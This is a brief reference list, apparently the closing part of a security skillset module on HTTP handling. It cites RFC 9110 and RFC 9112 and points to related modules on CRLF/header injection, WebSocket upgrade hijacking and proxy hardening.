- RFC 9110: HTTP Semantics.
- RFC 9112: HTTP/1.1 Messaging (framing, Content-Length vs Transfer-Encoding conflict handling).
- Cross-references within this skillset: INJ module (CRLF/header injection sinks), API module (WebSocket upgrade hijacking), CONFIG module (proxy hardening overlap).




